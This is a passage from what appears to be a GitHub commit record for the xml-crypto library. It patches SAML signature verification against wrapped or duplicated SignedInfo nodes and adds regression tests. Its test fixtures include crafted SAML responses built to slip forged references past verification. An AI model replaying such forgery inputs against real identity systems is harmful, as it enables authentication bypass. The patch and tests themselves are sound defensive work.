xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonPrincipalName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonTargetedID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.42\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.4\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.6\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.10\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion>\n+</samlp:Response>\n```",
                "url": "https://github.com/node-saml/xml-crypto/commit/28f92218ecbb8dcbd238afa4efbbd50302aa9aed"
            },
            {
                "content": "Merge commit from fork\n\n* Patch for version 2\n\n* Backport v6 patch, loading references from canon XML.\n\n* Only allow exclusive canon.\n\n* Updates based on v6 feedback.\n\n* Apply changes\n\n---------\n\nCo-authored-by: Blair Weber <blair@workos.com>\n\nFilename: lib/signed-xml.js:\n```\n@@ -383,6 +383,46 @@\nSignedXml.prototype.checkSignature = function(xml, callback) {\n \n   var doc = new Dom().parseFromString(xml)\n \n+  // Reset the references as only references from our re-parsed signedInfo node can be trusted\n+  this.references = [];\n+\n+  const unverifiedSignedInfoCanon = this.getCanonSignedInfoXml(doc);\n+  if (!unverifiedSignedInfoCanon) {\n+    if (callback) {\n+      callback(new Error(\"Canonical signed info not be empty\"));\n+      return;\n+    } else {\n+      throw new Error(\"Canonical signed info not be empty\");\n+    }\n+  }\n+\n+  // unsigned, verify later to keep with consistent callback behavior\n+  const unverifiedParsedSignedInfo = new Dom().parseFromString(unverifiedSignedInfoCanon, \"text/xml\");\n+\n+  const unverifiedSignedInfoDoc = unverifiedParsedSignedInfo.documentElement;\n+  if (!unverifiedSignedInfoDoc) {\n+    if (callback) {\n+      callback(new Error(\"Could not parse signedInfoCanon into a document\"));\n+      return;\n+    } else {\n+      throw new Error(\"Could not parse signedInfoCanon into a document\");\n+    }\n+  }\n+\n+  const references = utils.findChilds(unverifiedSignedInfoDoc, \"Reference\");\n+  if (references.length === 0) {\n+    if (callback) {\n+      callback(new Error(\"Could not find any Reference elements\"));\n+      return;\n+    } else {\n+      throw new Error(\"Could not find any Reference elements\");\n+    }\n+  }\n+\n+  for (const reference of references) {\n+    this.loadReference(reference);\n+  }\n+\n   if (!this.validateReferences(doc)) {\n     if (!callback) {\n       return false;\n\n@@ -392,6 +432,7 @@\nSignedXml.prototype.checkSignature = function(xml, callback) {\n     }\n   }\n \n+  // Stage B: Take the signature algorithm and key and verify the SignatureValue against the canonicalized SignedInfo\n   if (!callback) {\n     //Syncronous flow\n     if (!this.validateSignatureValue(doc)) {\n\n@@ -414,7 +455,14 @@\nSignedXml.prototype.checkSignature = function(xml, callback) {\n \n SignedXml.prototype.getCanonSignedInfoXml = function(doc) {\n   var signedInfo = utils.findChilds(this.signatureNode, \"SignedInfo\")\n-  if (signedInfo.length==0) throw new Error(\"could not find SignedInfo element in the message\")\n+  if (signedInfo.length == 0) {\n+    throw new Error(\"could not find SignedInfo element in the message\")\n+  }\n+  if (signedInfo.length > 1) {\n+    throw new Error(\n+      \"could not get canonicalized signed info for a signature that contains multiple SignedInfo nodes\",\n+    );\n+  }\n   \n   if(this.canonicalizationAlgorithm === \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\"\n   || this.canonicalizationAlgorithm === \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments\")\n\n@@ -494,7 +542,7 @@\nSignedXml.prototype.validateReferences = function(doc) {\n \n     var ref = this.references[r]\n \n-    var uri = ref.uri[0]==\"#\" ? ref.uri.substring(1) : ref.uri\n+    var uri = ref.uri ? (ref.uri[0]==\"#\" ? ref.uri.substring(1) : ref.uri) : \"\";\n     var elem = [];\n \n     if (uri==\"\") {\n\n@@ -596,8 +644,43 @@\nSignedXml.prototype.loadSignature = function(signatureNode) {\n   this.signatureAlgorithm =\n     utils.findFirst(signatureNode, \".//*[local-name(.)='SignatureMethod']/@Algorithm\").value\n \n+  const signedInfoNodes = utils.findChilds(this.signatureNode, \"SignedInfo\");\n+  if (signedInfoNodes.length == 0) {\n+    throw new Error(\"no signed info node found\");\n+  }\n+  if (signedInfoNodes.length > 1) {\n+    throw new Error(\"could not load signature that contains multiple SignedInfo nodes\");\n+  }\n+\n+  // Try to operate on the c14n version of `signedInfo`. This forces the initial `getReferences()`\n+  // API call to always return references that are loaded under the canonical `SignedInfo`\n+  // in the case that the client access the `.references` **before** signature verification.\n+\n+  // Ensure canonicalization algorithm is exclusive, otherwise we'd need the entire document\n+  let canonicalizationAlgorithmForSignedInfo = this.canonicalizationAlgorithm;\n+  if (\n+    !canonicalizationAlgorithmForSignedInfo ||\n+    canonicalizationAlgorithmForSignedInfo ===\n+      \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\" ||\n+    canonicalizationAlgorithmForSignedInfo ===\n+      \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments\"\n+  ) {\n+    canonicalizationAlgorithmForSignedInfo = \"http://www.w3.org/2001/10/xml-exc-c14n#\";\n+  }\n+\n+  const temporaryCanonSignedInfo = this.getCanonXml(\n+    [canonicalizationAlgorithmForSignedInfo],\n+    signedInfoNodes[0],\n+  );\n+  const temporaryCanonSignedInfoXml = new Dom().parseFromString(\n+    temporaryCanonSignedInfo,\n+    \"text/xml\",\n+  );\n+  const signedInfoDoc = temporaryCanonSignedInfoXml.documentElement;\n+\n   this.references = []\n-  var references = xpath.select(\".//*[local-name(.)='SignedInfo']/*[local-name(.)='Reference']\", signatureNode)\n+  \n+  const references = utils.findChilds(signedInfoDoc, \"Reference\");\n   if (references.length == 0) throw new Error(\"could not find any Reference elements\")\n \n   for (var i in references) {\n\n@@ -626,12 +709,16 @@\nSignedXml.prototype.loadReference = function(ref) {\n   var digestAlgo = attr.value\n \n   nodes = utils.findChilds(ref, \"DigestValue\")\n-  if (nodes.length==0) throw new Error(\"could not find DigestValue node in reference \" + ref.toString())\n-  if (nodes[0].childNodes.length==0 || !nodes[0].firstChild.data)\n-  {\n-    throw new Error(\"could not find the value of DigestValue in \" + nodes[0].toString())\n+  if (nodes.length > 1) {\n+    throw new Error(\n+      `could not load reference for a node that contains multiple DigestValue nodes: ${ref.toString()}`,\n+    );\n+  }\n+\n+  const digestValue = nodes[0].textContent;\n+  if (!digestValue) {\n+    throw new Error(`could not find the value of DigestValue in ${ref.toString()}`);\n   }\n-  var digestValue = nodes[0].firstChild.data\n \n   var transforms = []\n   var inclusiveNamespacesPrefixList;\n\n@@ -679,7 +766,8 @@\nSignedXml.prototype.loadReference = function(ref) {\n       transforms.push(\"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\")\n   }\n \n-  this.addReference(null, transforms, digestAlgo, utils.findAttr(ref, \"URI\").value, digestValue, inclusiveNamespacesPrefixList, false)\n+  const refUri = ref.getAttribute(\"URI\") || undefined;\n+  this.addReference(null, transforms, digestAlgo, refUri, digestValue, inclusiveNamespacesPrefixList, false)\n }\n \n SignedXml.prototype.addReference = function(xpath, transforms, digestAlgorithm, uri, digestValue, inclusiveNamespacesPrefixList, isEmptyUri) {\n```\n\nFilename: test/saml-response-test.js:\n```\n@@ -77,3 +77,102 @@\nexports['test validating SAML response WithComments'] = function (test) {\n   test.equal(result, false);\n   test.done();\n };\n+\n+exports[\"test validating SAML response with digest comment\"] = function (test) {\n+  var xml = fs.readFileSync(\"./test/static/valid_saml_with_digest_comment.xml\", \"utf-8\");\n+  var doc = new xmldom.DOMParser().parseFromString(xml);\n+  const assertion = xpath.select1(\"//*[local-name(.)='Assertion']\", doc);\n+  const signature = xpath.select1(\n+    \"//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+    assertion,\n+  );\n+  var sig = new crypto.SignedXml();\n+  sig.keyInfoProvider = new crypto.FileKeyInfo(\"./test/static/feide_public.pem\");\n+  sig.loadSignature(signature);\n+  var result = sig.checkSignature(xml);\n+  test.equal(sig.references[0].digestValue, \"RnNjoyUguwze5w2R+cboyTHlkQk=\");\n+  test.equal(result, false);\n+  test.done();\n+};\n+\n+exports[\"test signature contains a SignedInfo node\"] = function (test) {\n+  var xml = fs.readFileSync(\"./test/static/invalid_saml_no_signed_info.xml\", \"utf-8\");\n+  var doc = new xmldom.DOMParser().parseFromString(xml);\n+  const node = xpath.select1(\n+    \"/*/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+    doc,\n+  );\n+  var sig = new crypto.SignedXml();\n+  sig.keyInfoProvider = new crypto.FileKeyInfo(\"./test/static/feide_public.pem\");\n+  test.throws(\n+    function () {\n+      sig.loadSignature(node);\n+    },\n+    Error,\n+    \"no signed info node found\"\n+  );\n+  test.done();\n+};\n+\n+exports[\"throws an error for a document with no `SignedInfo` node\"] = function (\n+  test\n+) {\n+  var xml = fs.readFileSync(\n+    \"./test/static/invalid_saml_no_signed_info.xml\",\n+    \"utf-8\"\n+  );\n+  var doc = new xmldom.DOMParser().parseFromString(xml);\n+  const node = xpath.select1(\n+    \"/*/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+    doc\n+  );\n+  var sig = new crypto.SignedXml();\n+  const feidePublicCert = fs.readFileSync(\"./test/static/feide_public.pem\");\n+  sig.publicCert = feidePublicCert;\n+\n+  test.throws(\n+    function () {\n+      sig.loadSignature(node);\n+    },\n+    Error,\n+    \"no signed info node found\"\n+  );\n+  test.done();\n+};\n+\n+exports[\"test validation ignores an additional wrapped `SignedInfo` node\"] = function (test) {\n+  var xml = fs.readFileSync(\"./test/static/saml_wrapped_signed_info_node.xml\", \"utf-8\");\n+  var doc = new xmldom.DOMParser().parseFromString(xml);\n+  var assertion = xpath.select(\"//*[local-name(.)='Assertion']\", doc)[0];\n+  var signature = xpath.select(\n+    \"//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+    assertion\n+  )[0];\n+  var sig = new crypto.SignedXml();\n+  sig.keyInfoProvider = new crypto.FileKeyInfo(\"./test/static/saml_external_ns.pem\");\n+  sig.loadSignature(signature);\n+  test.equal(sig.references.length, 1);\n+  var result = sig.checkSignature(xml);\n+  test.equal(result, true);\n+  test.done();\n+};\n+\n+exports[\"test signature throws if multiple `SignedInfo` nodes are found\"] = function (test) {\n+  var xml = fs.readFileSync(\"./test/static/saml_multiple_signed_info_nodes.xml\", \"utf-8\");\n+  var doc = new xmldom.DOMParser().parseFromString(xml);\n+  var assertion = xpath.select(\"//*[local-name(.)='Assertion']\", doc)[0];\n+  var signature = xpath.select(\n+    \"//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+    assertion\n+  )[0];\n+  var sig = new crypto.SignedXml();\n+  sig.keyInfoProvider = new crypto.FileKeyInfo(\"./test/static/saml_external_ns.pem\");\n+  test.throws(\n+    function () {\n+      sig.loadSignature(signature);\n+    },\n+    Error,\n+    \"could not load signature that contains multiple SignedInfo nodes\"\n+  );\n+  test.done();\n+};\n```\n\nFilename: test/signature-unit-tests.js:\n```\n@@ -733,7 +733,7 @@\nfunction verifyDoesNotDuplicateIdAttributes(test, mode, prefix) {\n }\n \n function verifyAddsId(test, mode, nsMode) {\n-  var xml = \"<x xmlns=\\\"ns\\\"></x><y attr=\\\"value\\\"></y><z><w></w></z>\"\n+  var xml = \"<x xmlns=\\\"ns\\\"><y attr=\\\"value\\\"></y><z><w></w></z></x>\"\n   var sig = new SignedXml(mode)\n   sig.signingKey = fs.readFileSync(\"./test/static/client.pem\")\n```\n\nFilename: test/static/invalid_saml_no_signed_info.xml:\n```\n@@ -0,0 +1,9 @@\n+<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"pfx94e4a319-b6f7-4a40-25d1-01fcb642e4c5\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\" Destination=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n+  <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n+    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n+  <ds:SignatureValue>dkONrkxW+LSuDvnNMG/mWYFa47d2WGyapLhXSTYqrlT9Td+tT7ciojNJ55WTaPaCMt7IrGtIxxskPAZIjdIn5pRyDxHr0joWxzZ7oZHCOI1CnQV5HjOq+rzzmEN2LctCZ6S4hbL7SQ1qJ3vp2BCXAygy4tmJOURQdnk0KLwwRS8=</ds:SignatureValue>\n+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICizCCAfQCCQCY8tKaMc0BMjANBgkqhkiG9w0BAQUFADCBiTELMAkGA1UEBhMCTk8xEjAQBgNVBAgTCVRyb25kaGVpbTEQMA4GA1UEChMHVU5JTkVUVDEOMAwGA1UECxMFRmVpZGUxGTAXBgNVBAMTEG9wZW5pZHAuZmVpZGUubm8xKTAnBgkqhkiG9w0BCQEWGmFuZHJlYXMuc29sYmVyZ0B1bmluZXR0Lm5vMB4XDTA4MDUwODA5MjI0OFoXDTM1MDkyMzA5MjI0OFowgYkxCzAJBgNVBAYTAk5PMRIwEAYDVQQIEwlUcm9uZGhlaW0xEDAOBgNVBAoTB1VOSU5FVFQxDjAMBgNVBAsTBUZlaWRlMRkwFwYDVQQDExBvcGVuaWRwLmZlaWRlLm5vMSkwJwYJKoZIhvcNAQkBFhphbmRyZWFzLnNvbGJlcmdAdW5pbmV0dC5ubzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAt8jLoqI1VTlxAZ2axiDIThWcAOXdu8KkVUWaN/SooO9O0QQ7KRUjSGKN9JK65AFRDXQkWPAu4HlnO4noYlFSLnYyDxI66LCr71x4lgFJjqLeAvB/GqBqFfIZ3YK/NrhnUqFwZu63nLrZjcUZxNaPjOOSRSDaXpv1kb5k3jOiSGECAwEAATANBgkqhkiG9w0BAQUFAAOBgQBQYj4cAafWaYfjBU2zi1ElwStIaJ5nyp/s/8B8SAPK2T79McMyccP3wSW13LHkmM1jwKe3ACFXBvqGQN0IbcH49hu0FKhYFM/GPDJcIHFBsiyMBXChpye9vBaTNEBCtU3KjjyG0hRT2mAQ9h+bkPmOvlEo/aH0xR68Z9hw4PF13w==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" ID=\"pfx66496e6c-3c29-230d-6d47-b245434b872d\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n+  <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n+    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n+  <ds:Reference URI=\"#pfx66496e6c-3c29-230d-6d47-b245434b872d\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>RnNjoyUguwze5w2R+cboyTHlkQk=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>aw5711jKP7xragunjRRCAD4mT4xKHc37iohBpQDbdSomD3ksOSB96UZQp0MtaC3xlVSkMtYw85Om96T2q2xrxLLYVA50eFJEMMF7SCVPStWTVjBlaCuOPEQxIaHyJs9Sy3MCEfbBh4Pqn9IJBd1kzwdlCrWWjAmksbFFg5wHQJA=</ds:SignatureValue>\n+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICizCCAfQCCQCY8tKaMc0BMjANBgkqhkiG9w0BAQUFADCBiTELMAkGA1UEBhMCTk8xEjAQBgNVBAgTCVRyb25kaGVpbTEQMA4GA1UEChMHVU5JTkVUVDEOMAwGA1UECxMFRmVpZGUxGTAXBgNVBAMTEG9wZW5pZHAuZmVpZGUubm8xKTAnBgkqhkiG9w0BCQEWGmFuZHJlYXMuc29sYmVyZ0B1bmluZXR0Lm5vMB4XDTA4MDUwODA5MjI0OFoXDTM1MDkyMzA5MjI0OFowgYkxCzAJBgNVBAYTAk5PMRIwEAYDVQQIEwlUcm9uZGhlaW0xEDAOBgNVBAoTB1VOSU5FVFQxDjAMBgNVBAsTBUZlaWRlMRkwFwYDVQQDExBvcGVuaWRwLmZlaWRlLm5vMSkwJwYJKoZIhvcNAQkBFhphbmRyZWFzLnNvbGJlcmdAdW5pbmV0dC5ubzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAt8jLoqI1VTlxAZ2axiDIThWcAOXdu8KkVUWaN/SooO9O0QQ7KRUjSGKN9JK65AFRDXQkWPAu4HlnO4noYlFSLnYyDxI66LCr71x4lgFJjqLeAvB/GqBqFfIZ3YK/NrhnUqFwZu63nLrZjcUZxNaPjOOSRSDaXpv1kb5k3jOiSGECAwEAATANBgkqhkiG9w0BAQUFAAOBgQBQYj4cAafWaYfjBU2zi1ElwStIaJ5nyp/s/8B8SAPK2T79McMyccP3wSW13LHkmM1jwKe3ACFXBvqGQN0IbcH49hu0FKhYFM/GPDJcIHFBsiyMBXChpye9vBaTNEBCtU3KjjyG0hRT2mAQ9h+bkPmOvlEo/aH0xR68Z9hw4PF13w==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID SPNameQualifier=\"passport-saml\" Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\">_6c5dcaa3053321ff4d63785fbc3f67c59a129cde82</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2012-07-03T11:37:20Z\" Recipient=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2012-07-03T11:31:50Z\" NotOnOrAfter=\"2012-07-03T11:37:20Z\"><saml:AudienceRestriction><saml:Audience>passport-saml</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2012-07-03T11:32:20Z\" SessionNotOnOrAfter=\"2012-07-03T19:32:20Z\" SessionIndex=\"_c8e6823fe38ddbce125f9be6e5118b8c352d04bcae\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"uid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"givenName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"sn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"cn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"mail\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonPrincipalName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonTargetedID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.42\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.4\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.6\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.10\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>\n```\n\nFilename: test/static/saml_multiple_signed_info_nodes.xml:\n```\n@@ -0,0 +1 @@\n+<?xml version=\"1.0\"?><samlp:Response xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"GOSAMLR13708454654483\" Version=\"2.0\" IssueInstant=\"2013-06-10T06:24:25Z\" Destination=\"ForNodeJS\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"OUR_CUSTOM_ID\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/><ds:Reference URI=\"#pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>Gx0mTydMn1k6804jZBrdUrZmbV4=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignedInfo><ds:Reference URI=\"#OUR_CUSTOM_ID\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>jGst6BnAC9xOeqa6hKNPsoMm2TY=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>oHEPKtwoCbfq1QRm2pjx35zVMqAsti4nQU+3ws8EUJUXHmPG2EoX3HBkb7D2wN4m+ZFrdwARUpNJlhhOIz/eG4jES6ar0tvlNN3qE5cqcQhwZHyRARLnTlERqyZU9Qm729DnAGBeXCdMb736zi16onOIVPNA63LRTzUIxhyZqypDCf1wd6me/ur6UUgH11nYOu4JDYx0iWNkXc1Nad7vkF9oMPeO1QsMxuZSIVH4tvdJkue+qAnu2l+dFJb0LPfm+xmIC0FBo+VX1ECCWRoUZIxjotQfAM6yZpHIi5fNqPXkVyN9fYoUEa9CafqHlc4tAAdgAgGeOqA3jWeC8ZnOVA==</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIEHjCCAwagAwIBAgIBATANBgkqhkiG9w0BAQUFADBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbTAeFw0xMzA1MjcwODU1MTNaFw0xODA1MjcwODU1MTNaMGcxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQHDAxTYW50YSBNb25pY2ExETAPBgNVBAoMCE9uZUxvZ2luMRkwFwYDVQQDDBBhcHAub25lbG9naW4uY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoXoc7IFZQRv+SwJ15zjIl9touwY5e6b7H4vn3OtOUByjOKHUX8VX0TpbAV2ctZE2GSALx1AGuQAv6O4MVUH+qn/2IAiBY3a7zKN07UBsya7xFMQVHuGE6EiBAs9jpA9wjvYMPRkS5wYZcwjpTQSZK7zFPPtobG8K/1vDbm/tWZjNLmZmQePmXpwrQAuC0+NlzlmnjoQYB2xp2NaTUK9JnnmuB5qev3dpUwlYGSJpf+HUIoxuo8IpxAXOymq1d6tEEJgU1kR2sa7o1sSRFo31YeW/qYCP/gcLJZo3MRUDFe0g5MHeliFue9DsKYUsC6qwAD3gc+MI47buiD6Msu11cwIDAQABo4HUMIHRMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFAAJFJRIlpQQSFsuNdeq7FkTJIH4MIGRBgNVHSMEgYkwgYaAFAAJFJRIlpQQSFsuNdeq7FkTJIH4oWukaTBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbYIBATAOBgNVHQ8BAf8EBAMCBPAwDQYJKoZIhvcNAQEFBQADggEBAB9zN+g6N4sUBE61RaMUH2LSHWwOtfhL64i7pjHjvZa47/qcV/S0Yyd4IE44ho9i2N+AM79d34mThc30oK5aVxOKphKf+xM/cOyVaWIeqr+dCbkY/0OpLEwWOh9VSgOizRO3evLMurbtR892LbSK/Td3hG5jfwoHD23nHH87Dv/3KyZox9MkJdY2DXOHGGIcsqoIifaTyNZyhW6R